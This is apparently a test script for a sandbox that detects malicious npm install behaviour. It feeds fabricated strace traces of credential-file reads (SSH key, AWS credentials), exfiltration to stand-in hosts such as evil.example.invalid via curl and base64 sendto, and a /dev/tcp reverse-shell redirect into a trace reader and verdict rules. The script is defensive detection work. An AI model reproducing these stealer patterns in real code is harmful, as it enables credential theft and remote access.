// Offline checks for the sandbox tier (#45):  npm run verify-sandbox
//
// No Docker needed. Part 1 feeds hand-written strace output to the trace reader
// (sandbox-runner/analyze-trace.mjs). Part 2 checks how the API turns what the
// runner reports into verdict signals, and that a fake-credential read is a
// `block` while a clean run is not. The real end-to-end run, in Docker, is
// `npm run sandbox-test`. Exits 1 if any check fails.
import { analyzeTrace } from '../sandbox-runner/analyze-trace.mjs';
import { signalsFromSandbox, type SandboxResult } from '../src/lib/packages/sandbox';
import { scoreOf, verdictFor, type VerdictSignal } from '../src/lib/packages/analyze';

let failures = 0;
function check(label: string, ok: boolean, extra = '') {
  if (!ok) failures++;
  console.log(`${ok ? 'PASS' : 'FAIL'}  ${label}${extra ? `  (${extra})` : ''}`);
}

const CANARY = 'specter-canary-0123456789ab';
const verdictOf = (signals: VerdictSignal[]) => verdictFor(signals, scoreOf(signals), []);

// ── part 1: reading the trace ────────────────────────────────────────────

console.log('— trace reader');

const trace = (...lines: string[]) => lines.join('\n');
const SH = '20    execve("/usr/bin/sh", ["sh", "-c", "node index.js"], 0x1 /* 14 vars */) = 0';
const NODE = '21    execve("/usr/local/bin/node", ["node", "index.js"], 0x1 /* 14 vars */) = 0';

const benign = analyzeTrace(trace(
  SH, NODE,
  '21    openat(AT_FDCWD, "/work/node_modules/pkg/dist/index.js", O_RDONLY|O_CLOEXEC) = 17',
  '21    openat(AT_FDCWD, "/work/node_modules/pkg/dist/out.txt", O_WRONLY|O_CREAT|O_TRUNC, 0666) = 18',
  '21    connect(17, {sa_family=AF_UNIX, sun_path="/var/run/nscd/socket"}, 110) = -1 ENOENT (No such file or directory)',
  '21    connect(18, {sa_family=AF_INET, sin_port=htons(53), sin_addr=inet_addr("127.0.0.1")}, 16) = 0',
), { canary: CANARY });
check('a normal build script touches no honeypot and reaches no network', benign.honeypotReads.length === 0 && benign.network.length === 0);
check('its own processes are listed', benign.processes.some((p) => p.path === '/usr/local/bin/node' && p.args === 'index.js'));

const stealer = analyzeTrace(trace(
  SH, NODE,
  '21    openat(AT_FDCWD, "/home/sandbox/.ssh/id_rsa", O_RDONLY|O_CLOEXEC) = 17',
  '21    openat(AT_FDCWD, "/home/sandbox/.aws/credentials", O_RDONLY|O_CLOEXEC) = 18',
  // DNS query for evil.example.invalid, as glibc sends it
  '21    sendmmsg(19, [{msg_hdr={msg_name=NULL, msg_namelen=0, msg_iov=[{iov_base="\\253\\1\\1\\0\\0\\1\\0\\0\\0\\0\\0\\0\\4evil\\7example\\7invalid\\0\\0\\1\\0\\1", iov_len=36}], msg_iovlen=1, msg_controllen=0, msg_flags=0}, msg_len=36}], 1, MSG_NOSIGNAL) = 1',
  '21    connect(20, {sa_family=AF_INET, sin_port=htons(443), sin_addr=inet_addr("203.0.113.9")}, 16) = -1 ENETUNREACH (Network is unreachable)',
), { canary: CANARY });
check('reading the fake SSH key and AWS file is caught', stealer.honeypotReads.length === 2 && stealer.honeypotReads[0].path === '/home/sandbox/.ssh/id_rsa');
check('the host name is recovered from the DNS query', stealer.network.some((n: { kind: string; host?: string }) => n.kind === 'dns' && n.host === 'evil.example.invalid'));
check('a connect to a public IP is recorded', stealer.network.some((n: { kind: string; address?: string; port?: number }) => n.kind === 'connect' && n.address === '203.0.113.9' && n.port === 443));

const missing = analyzeTrace(trace(SH, NODE, '21    openat(AT_FDCWD, "/home/sandbox/.ssh/id_rsa", O_RDONLY) = -1 ENOENT (No such file or directory)'), { canary: CANARY });
check('a probe that finds no file (ENOENT) is not counted', missing.honeypotReads.length === 0);

const relative = analyzeTrace(trace(
  SH, NODE,
  '21    chdir("/home/sandbox/.ssh") = 0',
  '21    openat(AT_FDCWD, "id_rsa", O_RDONLY) = 17',
  '21    openat(AT_FDCWD, "/work/../home/sandbox/.aws/credentials", O_RDONLY) = 18',
), { canary: CANARY });
check('a relative path after chdir, and a ../ path, resolve to the honeypots', relative.honeypotReads.length === 2);

const forked = analyzeTrace(trace(
  SH, NODE,
  '21    chdir("/home/sandbox/.ssh") = 0',
  '21    clone(child_stack=NULL, flags=CLONE_CHILD_CLEARTID|SIGCHLD) = 30',
  '30    openat(AT_FDCWD, "id_rsa", O_RDONLY) = 5',
), { canary: CANARY });
check('a child process inherits its parent\'s working directory', forked.honeypotReads.length === 1);

const npmReads = analyzeTrace(trace(
  '40    execve("/usr/local/bin/node", ["node", "/usr/local/lib/node_modules/npm/bin/npm-cli.js", "run", "build"], 0x1 /* 14 vars */) = 0',
  '40    openat(AT_FDCWD, "/home/sandbox/.npmrc", O_RDONLY) = 6',
), { canary: CANARY });
check('npm reading its own ~/.npmrc is not theft', npmReads.honeypotReads.length === 0);

const otherReadsNpmrc = analyzeTrace(trace(NODE, '21    openat(AT_FDCWD, "/home/sandbox/.npmrc", O_RDONLY) = 6'), { canary: CANARY });
check('any other program reading ~/.npmrc is', otherReadsNpmrc.honeypotReads.length === 1);

const interrupted = analyzeTrace(trace(NODE, '21    openat(AT_FDCWD, "/home/sandbox/.ssh/id_rsa", O_RDONLY <unfinished ...>', '22    <... something resumed>) = 0'), { canary: CANARY });
check('a call split across two lines is still seen', interrupted.honeypotReads.length === 1);

const splitConnect = analyzeTrace(trace(
  NODE,
  '24    connect(19, {sa_family=AF_INET, sin_port=htons(80), sin_addr=inet_addr("192.0.2.1")}, 16 <unfinished ...>',
  '31    <... connect resumed>)            = -1 ENOENT (No such file or directory)',
  '24    <... connect resumed>)            = -1 ENETUNREACH (Network is unreachable)',
), { canary: CANARY });
check('a connect split across two lines gets its outcome from the resumed half',
  splitConnect.network.length === 1 && splitConnect.network[0].result === 'ENETUNREACH');

const b64 = Buffer.from(`token=${CANARY}-npm-env`).toString('base64');
const leaks = analyzeTrace(trace(
  NODE,
  `21    execve("/usr/bin/curl", ["curl", "-d", "${CANARY}-npm-env", "http://x.invalid"], 0x1 /* 14 vars */) = -1 ENOENT (No such file or directory)`,
  `21    sendto(5, "POST / HTTP/1.1\\r\\n\\r\\n${b64}", 40, MSG_NOSIGNAL, {sa_family=AF_INET, sin_port=htons(80), sin_addr=inet_addr("203.0.113.9")}, 16) = -1 ENETUNREACH (Network is unreachable)`,
), { canary: CANARY });
check('a planted secret in a command line is caught', leaks.tokenLeaks.some((l: { via: string }) => l.via === 'execve'));
check('a planted secret sent base64-encoded is caught', leaks.tokenLeaks.some((l: { via: string; encoding: string }) => l.via === 'network' && l.encoding === 'base64'));
check('a failed execve of curl is still listed', leaks.processes.some((p: { path: string; ok: boolean }) => p.path === '/usr/bin/curl' && !p.ok));

const shellSearch = analyzeTrace(trace(
  '21    execve("/usr/local/bin/git", ["git", "log"], 0x1 /* 14 vars */) = -1 ENOENT (No such file or directory)',
  '21    execve("/usr/bin/git", ["git", "log"], 0x1 /* 14 vars */) = 0',
), { canary: CANARY });
check('failed PATH-search attempts are dropped once the command ran', shellSearch.processes.length === 1 && shellSearch.processes[0].ok);

// ── part 2: what the API makes of it ─────────────────────────────────────

console.log('— verdict rules');

const base: SandboxResult = { target: 'x@1.0.0', phases: { install: { ok: true }, run: { ok: true } }, events: [{ event: 'script' }] };
const label = 'x@1.0.0';

const clean = signalsFromSandbox({ ...base, ...benign }, label);
check('a clean run yields a single info signal', clean.length === 1 && clean[0].type === 'sandbox_clean');
// The package was escalated because it already scored at the warn level
const escalated: VerdictSignal[] = [{ type: 'install_script', severity: 'high', title: 't', detail: 'd' }];
check('a clean run does not push an escalated package to block', verdictOf([...escalated, ...clean]) === 'warn');

const stolen = signalsFromSandbox({ ...base, ...stealer }, label);
check('reading fake credentials is a critical signal', stolen.some((s) => s.type === 'sandbox_honeypot_read' && s.severity === 'critical'));
check('an unknown host is a high signal', stolen.some((s) => s.type === 'sandbox_network' && s.severity === 'high' && /evil\.example\.invalid/.test(s.detail)));
check('reading fake credentials alone is a block', verdictOf(stolen.filter((s) => s.type === 'sandbox_honeypot_read')) === 'block');

const known = signalsFromSandbox({ ...base, network: [{ kind: 'dns', host: 'github.com' }] }, label);
check('trying to reach github.com is only a low signal', known.some((s) => s.type === 'sandbox_network' && s.severity === 'low'));

const network = signalsFromSandbox({ ...base, network: [{ kind: 'dns', host: 'probe.example.invalid' }] }, label);
check('an unknown host alone is not a block', verdictOf(network) !== 'block');
check('but it does push an escalated package up', scoreOf([...escalated, ...network]) > scoreOf(escalated));

const leakSignals = signalsFromSandbox({ ...base, tokenLeaks: [{ syscall: 'execve', via: 'execve', encoding: 'plain' }] }, label);
check('a leaked fake secret is a block', verdictOf(leakSignals) === 'block');

const tools = signalsFromSandbox({ ...base, processes: [{ path: '/usr/bin/curl', args: 'http://x.invalid', ok: false }] }, label);
check('launching curl from an install script is a high signal', tools.some((s) => s.type === 'sandbox_process' && s.severity === 'high'));

const shellTrick = signalsFromSandbox({ ...base, processes: [{ path: '/usr/bin/sh', args: '-c exec 3<>/dev/tcp/1.2.3.4/80', ok: true }] }, label);
check('a /dev/tcp reverse-shell redirect is a high signal', shellTrick.some((s) => s.type === 'sandbox_process' && s.severity === 'high'));

const fine = signalsFromSandbox({ ...base, processes: [{ path: '/usr/bin/sh', args: '-c echo building && node build.js', ok: true }, { path: '/usr/local/bin/node', args: 'build.js', ok: true }] }, label);
check('sh and node running a build are fine', fine.length === 1 && fine[0].type === 'sandbox_clean');

const timedOut = signalsFromSandbox({ ...base, phases: { install: { ok: true }, run: { ok: false, timedOut: true } } }, label);
check('a run that hit the time limit says so, and is not called clean-and-done', timedOut.some((s) => s.type === 'sandbox_skipped') && timedOut.some((s) => s.type === 'sandbox_clean'));

console.log(failures === 0 ? '\nAll checks passed.' : `\n${failures} check(s) FAILED.`);
process.exit(failures === 0 ? 0 : 1);
